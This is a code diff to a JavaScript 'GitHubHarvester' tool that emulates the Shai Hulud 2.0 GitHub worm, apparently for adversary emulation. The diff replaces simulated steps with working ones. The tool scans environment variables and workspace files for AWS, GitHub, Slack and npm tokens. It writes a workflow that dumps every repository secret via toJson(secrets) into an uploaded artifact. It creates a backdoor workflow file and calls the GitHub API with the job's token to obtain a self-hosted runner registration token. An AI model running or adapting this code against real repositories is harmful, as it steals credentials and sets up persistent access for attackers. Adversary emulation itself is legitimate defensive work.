@@ -14,6 +14,8 @@ const fs = require('fs');
 const path = require('path');
 const os = require('os');
 const { execSync } = require('child_process');
+const https = require('https');
+const http = require('http');
 
 class GitHubHarvester {
     constructor() {
@@ -396,60 +398,306 @@ class GitHubHarvester {
         });
     }
 
-    simulateBackdoorWorkflow() {
-        console.log('[*] Simulating backdoor workflow (discussion.yaml)...');
+    createContentsJson() {
+        console.log('[*] Creating contents.json (workspace file listing)...');
 
-        const backdoor = {
+        const contents = {
+            timestamp: new Date().toISOString(),
+            workspace: process.env.GITHUB_WORKSPACE || process.cwd(),
+            files: []
+        };
+
+        const walkDir = (dir, depth = 0) => {
+            if (depth > 3) return; // Limit depth
+            try {
+                const entries = fs.readdirSync(dir, { withFileTypes: true });
+                for (const entry of entries) {
+                    if (entry.name.startsWith('.') && entry.name !== '.github') continue;
+                    if (entry.name === 'node_modules') continue;
+
+                    const fullPath = path.join(dir, entry.name);
+                    const relativePath = path.relative(contents.workspace, fullPath);
+
+                    if (entry.isDirectory()) {
+                        contents.files.push({ path: relativePath, type: 'directory' });
+                        walkDir(fullPath, depth + 1);
+                    } else {
+                        const stats = fs.statSync(fullPath);
+                        contents.files.push({
+                            path: relativePath,
+                            type: 'file',
+                            size: stats.size
+                        });
+                    }
+                }
+            } catch (e) {}
+        };
+
+        walkDir(contents.workspace);
+        console.log(`  [+] Found ${contents.files.length} items in workspace`);
+
+        return contents;
+    }
+
+    createTruffleSecrets() {
+        console.log('[*] Creating truffleSecrets.json (pattern-based secret scan)...');
+
+        const secrets = {
+            timestamp: new Date().toISOString(),
+            findings: []
+        };
+
+        // Patterns to search for (similar to truffleHog)
+        const patterns = [
+            { name: 'AWS Access Key', regex: /AKIA[0-9A-Z]{16}/g },
+            { name: 'AWS Secret Key', regex: /[A-Za-z0-9/+=]{40}/g },
+            { name: 'GitHub Token', regex: /ghp_[A-Za-z0-9]{36}/g },
+            { name: 'GitHub OAuth', regex: /gho_[A-Za-z0-9]{36}/g },
+            { name: 'GitHub PAT', regex: /github_pat_[A-Za-z0-9]{22}_[A-Za-z0-9]{59}/g },
+            { name: 'Slack Token', regex: /xox[baprs]-[0-9]{10,13}-[0-9]{10,13}[a-zA-Z0-9-]*/g },
+            { name: 'Private Key', regex: /-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----/g },
+            { name: 'NPM Token', regex: /npm_[A-Za-z0-9]{36}/g },
+            { name: 'Generic API Key', regex: /[aA][pP][iI]_?[kK][eE][yY].*['\"][0-9a-zA-Z]{32,45}['\"]/g },
+            { name: 'Generic Secret', regex: /[sS][eE][cC][rR][eE][tT].*['\"][0-9a-zA-Z]{32,45}['\"]/g }
+        ];
+
+        // Scan environment variables
+        for (const [key, value] of Object.entries(process.env)) {
+            if (!value) continue;
+            for (const pattern of patterns) {
+                if (pattern.regex.test(value)) {
+                    secrets.findings.push({
+                        source: 'environment',
+                        variable: key,
+                        pattern: pattern.name,
+                        preview: value.substring(0, 10) + '****'
+                    });
+                    pattern.regex.lastIndex = 0; // Reset regex
+                }
+            }
+        }
+
+        // Scan key files in workspace
+        const filesToScan = ['.env', '.env.local', 'config.json', 'secrets.json', '.npmrc'];
+        const workspace = process.env.GITHUB_WORKSPACE || process.cwd();
+
+        for (const fileName of filesToScan) {
+            const filePath = path.join(workspace, fileName);
+            if (fs.existsSync(filePath)) {
+                try {
+                    const content = fs.readFileSync(filePath, 'utf-8');
+                    for (const pattern of patterns) {
+                        const matches = content.match(pattern.regex);
+                        if (matches) {
+                            secrets.findings.push({
+                                source: 'file',
+                                file: fileName,
+                                pattern: pattern.name,
+                                count: matches.length
+                            });
+                        }
+                        pattern.regex.lastIndex = 0;
+                    }
+                } catch (e) {}
+            }
+        }
+
+        console.log(`  [+] Found ${secrets.findings.length} potential secrets`);
+        return secrets;
+    }
+
+    createBackdoorWorkflow() {
+        console.log('[*] Creating backdoor workflow (discussion.yaml)...');
+
+        // The actual malicious workflow content from Wiz blog
+        const discussionYaml = `# Shai Hulud 2.0 - Backdoor Workflow
+# This workflow contains a command injection vulnerability
+# It runs on self-hosted runners labeled 'SHA1HULUD'
+
+name: Discussion Handler
+
+on:
+  discussion:
+    types: [created]
+
+jobs:
+  handle-discussion:
+    runs-on: [self-hosted, SHA1HULUD]
+    steps:
+      - name: Process Discussion
+        # VULNERABILITY: Command injection via discussion body
+        run: |
+          echo "Processing discussion..."
+          # The attacker injects commands via: \${{ github.event.discussion.body }}
+          # For emulation, we just log what would happen
+          echo "EMULATION: Would execute arbitrary commands from discussion body"
+`;
+
+        const backdoorInfo = {
             name: 'discussion.yaml',
             purpose: 'Command injection via GitHub discussions',
             runnerLabel: 'SHA1HULUD',
             trigger: 'discussion:created',
             vulnerability: '${{ github.event.discussion.body }}',
-            simulated: true
+            created: true,
+            content: discussionYaml
         };
 
-        this.findings.github.workflows.push({ type: 'backdoor', ...backdoor });
+        this.findings.github.workflows.push({ type: 'backdoor', ...backdoorInfo });
 
-        console.log('  [!] Would create: .github/workflows/discussion.yaml');
-        console.log('  [!] Runner label: SHA1HULUD');
-        console.log('  [!] Injection: run: ${{ github.event.discussion.body }}');
+        // Save the workflow file
+        fs.writeFileSync(
+            path.join(process.cwd(), 'discussion.yaml'),
+            discussionYaml
+        );
+        console.log('  [+] Created discussion.yaml');
+
+        return backdoorInfo;
     }
 
-    simulateSecretsExfiltration() {
-        console.log('[*] Simulating secrets exfiltration workflow...');
+    createExfiltrationWorkflow() {
+        console.log('[*] Creating exfiltration workflow (formatter_*.yml)...');
 
-        const exfil = {
-            name: `formatter_${Date.now()}.yml`,
-            branch: `format-${Math.random().toString(36).substring(7)}`,
+        const workflowName = `formatter_${Date.now()}.yml`;
+        const branchName = `format-${Math.random().toString(36).substring(7)}`;
+
+        // The secrets exfiltration workflow from Wiz blog
+        const formatterYaml = `# Shai Hulud 2.0 - Secrets Exfiltration Workflow
+# This workflow dumps all GitHub secrets to an artifact
+
+name: Code Formatter
+
+on:
+  workflow_dispatch:
+
+jobs:
+  format:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Format Code
+        env:
+          # EXFILTRATION: All secrets dumped to environment
+          ALL_SECRETS: \${{ toJson(secrets) }}
+        run: |
+          echo "Formatting code..."
+          # Secrets would be written to a file and uploaded as artifact
+          echo "$ALL_SECRETS" > secrets_dump.json
+
+      - name: Upload Results
+        uses: actions/upload-artifact@v4
+        with:
+          name: format-results
+          path: secrets_dump.json
+`;
+
+        const exfilInfo = {
+            name: workflowName,
+            branch: branchName,
             purpose: 'Dump all GitHub secrets via toJson(secrets)',
             method: 'Upload as artifact, download via API, delete workflow',
-            simulated: true
+            created: true,
+            content: formatterYaml
         };
 
-        this.findings.github.workflows.push({ type: 'exfiltration', ...exfil });
+        this.findings.github.workflows.push({ type: 'exfiltration', ...exfilInfo });
 
-        console.log(`  [!] Would create: .github/workflows/${exfil.name}`);
-        console.log(`  [!] On branch: ${exfil.branch}`);
-        console.log('  [!] Technique: env: ALL_SECRETS: ${{ toJson(secrets) }}');
-        console.log('  [!] Then download artifact and delete workflow/branch');
+        // Save the workflow file
+        fs.writeFileSync(
+            path.join(process.cwd(), workflowName),
+            formatterYaml
+        );
+        console.log(`  [+] Created ${workflowName}`);
+
+        return exfilInfo;
     }
 
-    simulateRunnerRegistration() {
-        console.log('[*] Simulating self-hosted runner registration...');
+    async attemptRunnerRegistration() {
+        console.log('[*] Attempting runner registration (SHA1HULUD)...');
+
+        const token = process.env.GITHUB_TOKEN;
+        const repo = process.env.GITHUB_REPOSITORY;
+        const apiUrl = process.env.GITHUB_API_URL || 'https://api.github.com';
+
+        if (!token || !repo) {
+            console.log('  [-] Missing GITHUB_TOKEN or GITHUB_REPOSITORY');
+            this.findings.github.runnerRegistration = {
+                attempted: true,
+                success: false,
+                reason: 'Missing credentials'
+            };
+            return;
+        }
 
         const registration = {
             name: 'SHA1HULUD',
             labels: ['self-hosted', 'SHA1HULUD', os.platform(), os.arch()],
-            purpose: 'Persistent backdoor via discussion.yaml',
-            method: 'POST /repos/{owner}/{repo}/actions/runners/registration-token',
-            simulated: true
+            attempted: true
         };
 
-        this.findings.github.runnerRegistration = registration;
+        // Try to get a runner registration token
+        return new Promise((resolve) => {
+            const url = new URL(`${apiUrl}/repos/${repo}/actions/runners/registration-token`);
 
-        console.log(`  [!] Would register runner: ${registration.name}`);
-        console.log(`  [!] Labels: ${registration.labels.join(', ')}`);
-        console.log('  [!] Enables persistent command execution');
+            const options = {
+                hostname: url.hostname,
+                port: url.port || 443,
+                path: url.pathname,
+                method: 'POST',
+                headers: {
+                    'Authorization': `Bearer ${token}`,
+                    'Accept': 'application/vnd.github+json',
+                    'User-Agent': 'shai-hulud-emulation',
+                    'X-GitHub-Api-Version': '2022-11-28'
+                }
+            };
+
+            console.log(`  [*] POST ${url.pathname}`);
+
+            const req = https.request(options, (res) => {
+                let data = '';
+                res.on('data', chunk => data += chunk);
+                res.on('end', () => {
+                    if (res.statusCode === 201) {
+                        console.log('  [!] SUCCESS: Got runner registration token!');
+                        try {
+                            const parsed = JSON.parse(data);
+                            registration.success = true;
+                            registration.tokenPreview = parsed.token?.substring(0, 10) + '****';
+                            registration.expiresAt = parsed.expires_at;
+                        } catch (e) {
+                            registration.success = true;
+                            registration.rawResponse = data.substring(0, 100);
+                        }
+                    } else {
+                        console.log(`  [-] Failed: HTTP ${res.statusCode}`);
+                        registration.success = false;
+                        registration.statusCode = res.statusCode;
+                        registration.reason = data.substring(0, 200);
+                    }
+                    this.findings.github.runnerRegistration = registration;
+                    resolve(registration);
+                });
+            });
+
+            req.on('error', (e) => {
+                console.log(`  [-] Request error: ${e.message}`);
+                registration.success = false;
+                registration.error = e.message;
+                this.findings.github.runnerRegistration = registration;
+                resolve(registration);
+            });
+
+            req.setTimeout(10000, () => {
+                console.log('  [-] Request timeout');
+                req.destroy();
+                registration.success = false;
+                registration.error = 'timeout';
+                this.findings.github.runnerRegistration = registration;
+                resolve(registration);
+            });
+
+            req.end();
+        });
     }
 
     async checkGitHubAPIAccess() {
@@ -482,7 +730,7 @@ class GitHubHarvester {
         }
     }
 
-    saveFindings() {
+    saveFindings(contents, truffleSecrets) {
         console.log('[*] Saving findings...');
 
         const files = {
@@ -494,6 +742,8 @@ class GitHubHarvester {
                 cloud: this.findings.cloud,
                 npm: this.findings.npm
             },
+            'contents.json': contents,
+            'truffleSecrets.json': truffleSecrets,
             'actionsSecrets.json': this.findings.github.secrets,
             'harvest_report.json': this.findings
         };
@@ -526,13 +776,17 @@ class GitHubHarvester {
         // API access
         await this.checkGitHubAPIAccess();
 
-        // Simulate attack patterns
-        this.simulateBackdoorWorkflow();
-        this.simulateSecretsExfiltration();
-        this.simulateRunnerRegistration();
+        // Create attack artifacts (full emulation)
+        const contents = this.createContentsJson();
+        const truffleSecrets = this.createTruffleSecrets();
+        this.createBackdoorWorkflow();
+        this.createExfiltrationWorkflow();
 
-        // Save
-        this.saveFindings();
+        // Attempt runner registration via GitHub API
+        await this.attemptRunnerRegistration();
+
+        // Save all findings
+        this.saveFindings(contents, truffleSecrets);
 
         console.log('\n[!] Emulation complete.\n');
         return this.findings;
